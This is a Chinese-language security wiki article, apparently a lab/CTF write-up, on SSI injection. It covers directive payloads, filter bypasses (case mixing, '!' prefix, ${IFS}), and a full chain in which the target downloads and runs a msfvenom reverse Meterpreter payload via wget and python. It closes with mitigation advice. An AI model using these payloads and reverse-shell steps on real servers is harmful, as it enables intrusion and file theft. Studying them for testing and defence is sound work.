---
title: SSI 服务端包含注入漏洞原理与实战攻击链
description: 系统梳理 SSI（Server Side Includes）注入漏洞原理、常见指令、检测利用姿势、过滤绕过技巧（大小写变形、感叹号前缀等）及实战逆向
  Shell 完整攻击链
category: program-analysis
tags:
- SSI
- Server Side Includes
- 命令注入
- 过滤绕过
- 反弹Shell
- CTF
- 渗透测试
- Web安全
date: 2025-08-20
updated: '2026-11-14'
---
## 概述

**SSI（Server Side Includes，服务端包含）** 是一种嵌入在 HTML 页面中的指令，服务器在页面被请求时解析并执行，用于赋予静态页面动态效果。当 Web 服务器开启 SSI 支持且对用户可控输入未做严格过滤时，攻击者可注入 SSI 指令实现**任意命令执行、文件读写、目录遍历**等高危操作。

> ⚠️ 原文标题误写为 "SSL注入"，实为 **SSI 注入**。SSL 为传输层加密协议，与本漏洞无关。

## 环境指纹识别

### 典型文件后缀
服务器启用 SSI 解析的常见后缀：
- `.shtml`
- `.shtm`
- `.stm`

### 扫描与枚举工具链
| 工具 | 命令示例 | 关键指纹 |
|------|----------|----------|
| **nmap** | `nmap -sV -T4 -A -v <target>` | 识别 Apache `mod_include`、目录索引、多视图 |
| **nikto** | `nikto -host http://<target>` | 检测 `.shtml`、目录遍历、robots.txt 敏感路径 |
| **dirb** | `dirb http://<target>` | 爆破隐藏目录 `/ssi/`、`/spukcab/` 等 |

> 实战中常结合 `robots.txt` 发现 `Disallow` 目录，下载备份文件（如 `index.php.bak`、`oldconfig.bak`）获取源码与配置信息。[[attack-defense-world-beginner-web-writeup#信息收集与敏感文件泄露]]

## 核心指令集

SSI 指令格式：`<!--#directive parameter="value" -->`，常用指令如下：

| 指令 | 作用 | 典型 Payload |
|------|------|--------------|
| `exec` | 执行系统命令 | `<!--#exec cmd="ls" -->` |
| `include` | 包含文件内容 | `<!--#include file="/etc/passwd" -->` |
| `echo` | 输出变量值 | `<!--#echo var="DOCUMENT_ROOT" -->` |
| `config` | 修改错误/时间格式 | `<!--#config errmsg="<!--#exec cmd='id' -->" -->` |
| `flastmod` / `fsize` | 显示文件修改时间/大小 | 信息泄露辅助 |

> `exec` 是攻击面最直接的指令，配合命令拼接可完成**反弹 Shell、写 Webshell、提权**全链路。[[php-file-inclusion-vulnerability#伪协议利用链]]

## 检测与验证流程

1. **确认解析后缀**  
   访问 `/index.shtml`、`/test.shtml` 观察是否正常渲染。
2. **注入测试 Payload**  
   ```html
   <!--#exec cmd="id" -->
   <!--#exec cmd="ls /" -->
   ```
3. **观察回显**  
   - 若页面出现 `uid=33(www-data)` 或目录列表 → **存在漏洞**  
   - 若返回原文或报错 → 可能有过滤/WAF，需绕过。

## 过滤绕过技巧

实战中常见过滤规则及绕过方式：

| 过滤规则 | 绕过 Payload | 原理 |
|----------|--------------|------|
| 关键字 `exec` 大小写敏感 | `<!--#EXEC cmd="id" -->` | Apache `mod_include` 指令**不区分大小写** |
| 过滤 `<!--#exec` 完整串 | `<!--!#EXEC cmd="id" -->` | **感叹号 `!` 前缀** 可打断正则匹配，解析器仍识别 |
| 组合绕过 | `<!--!#ExEc cmd="cat /etc/passwd" -->` | 大小写混淆 + `!` 前缀双重保险 |
| 空格/编码过滤 | `<!--#exec cmd="cat${IFS}/etc/passwd" -->` | 利用 Shell 变量 `${IFS}` 替代空格 |

> 上述技巧在 [[ctf-show-php-command-execution-bypass-techniques#Bash-内置变量展开与无字母数字-RCE]] 与 [[ssrf-bypass-techniques#绕过技巧总结]] 中均有同构应用。

## 实战攻击链完整复现

> 以下复现基于归档文章靶场（Kali 192.168.234.28 → Ubuntu 192.168.234.132）

### 1️⃣ 信息收集与入口发现
```bash
nmap -sV -T4 -A -v 192.168.234.132
nikto -host http://192.168.234.132
dirb http://192.168.234.132
```
- `robots.txt` 泄露 `/spukcab/` 目录  
- 下载 `index.php.bak` 获取 Flag1 与 SSI 入口 `/ssi/`  
- `oldconfig.bak` 泄露系统配置信息

### 2️⃣ 命令执行验证与绕过
```html
<!-- 原始 Payload 被拦截 -->
<!--#exec cmd="ls" -->

<!-- 大小写绕过 -->
<!--#EXEC cmd="ls" -->

<!-- 组合绕过（实测成功） -->
<!--!#EXEC cmd="cat /etc/passwd" -->
```
成功读取 `/etc/passwd` 确认命令执行无回显限制。

### 3️⃣ 反弹 Shell 全链路

#### 攻击机准备
```bash
# 生成 Python Meterpreter 反弹载荷
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.234.128 LPORT=4444 -f raw > shell.py

# 启动 HTTP 服务托管载荷
mv shell.py /var/www/html/
systemctl start apache2

# Metasploit 监听
msfconsole -q -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST 192.168.234.128; set LPORT 4444; run"
```

#### 靶机执行链
```html
<!-- 下载载荷 -->
<!--!#EXEC cmd="wget http://192.168.234.128/shell.py" -->

<!-- 执行载荷 -->
<!--!#EXEC cmd="python shell.py" -->
```

#### 会话交互与提权
```bash
meterpreter > sysinfo          # 确认架构
meterpreter > shell            # 落地交互式 Shell
python -c "import pty; pty.spawn('/bin/bash')"  # 优化终端
cd /root && ls && cat flag     # 获取 Flag
```

> 同类反弹 Shell 链路亦见于 [[0w1club-training-shellshock-cgi-exploitation#User-Agent-注入反弹-Shell]]、[[vulnhub-doubletrouble-writeup#完整攻击链复现]]、[[php-webshell-fundamentals-chopper-analysis#实战连接流程]]。

## 防御与修复建议

| 层面 | 措施 |
|------|------|
| **服务器配置** | 关闭不必要的 `mod_include` / `Options Includes`；仅在受信目录启用 SSI |
| **代码层** | 对用户输入做**严格白名单校验**；过滤 `<!--#`、`-->`、`exec`、`include` 等关键字（需大小写不敏感） |
| **WAF/规则** | 部署规则拦截 `<!--#`、`<!--!#` 等变体；结合语义分析而非单纯正则 |
| **最小权限** | Web 进程以低权限用户运行；禁用 `exec` 指令（`Options IncludesNOEXEC`） |
| **审计监控** | 记录 SSI 解析日志；告警异常命令执行模式 |

## 交叉引用与延伸阅读

- [[php-file-inclusion-vulnerability]] — 文件包含与伪协议利用链，常与 SSI 组合扩大攻击面  
- [[ssrf-bypass-techniques]] — 绕过技巧方法论（大小写、编码、前缀干扰）通用性强  
- [[ctf-show-php-command-execution-bypass-techniques]] — PHP 命令执行绕过大全，含 `disable_functions` 突破  
- [[internal-network-pivoting-techniques]] — 拿到 Shell 后的内网穿透、横向移动、代理搭建  
- [[vulnhub-doubletrouble-writeup]] — Shellshock + Dirty COW 完整靶机复现，对比 CGI 与 SSI 注入差异  
- [[attack-defense-world-beginner-web-writeup]] — Web 入门题集，含命令执行、Webshell、信息泄露基础实战  
- [[frp内网渗透应用]] — 反向代理、Socks5 隧道、多级跳板实战配置  
- [[php-webshell-fundamentals-chopper-analysis]] — 一句话木马原理、蚁剑/菜刀连接流程、Content-Type 绕过上传  

## 总结

SSI 注入虽属“老牌”漏洞，但在遗留系统、误配置服务器、CTF 靶场中仍高发。核心要点：
1. **识别后缀**（`.shtml`/`.shtm`/`.stm`）与 `mod_include` 开启状态  
2. **掌握 `exec`/`include` 等高危指令** 与组合利用链  
3. **绕过套路**：大小写混淆 + `!` 前缀 + Shell 变量替代空格  
4. **完整攻击链**：枚举 → 命令执行 → 反弹 Shell → 终端优化 → 后渗透  
5. **修复核心**：关闭不必要功能、白名单过滤、最小权限运行、日志审计

> 将上述技术内化为**标准化检测清单**与**利用模板**，可显著提升实战与 CTF 解题效率。

## 来源

- [0x00实验室-202108-202304_094](../sources/0x00实验室-202108-202304_094.md)
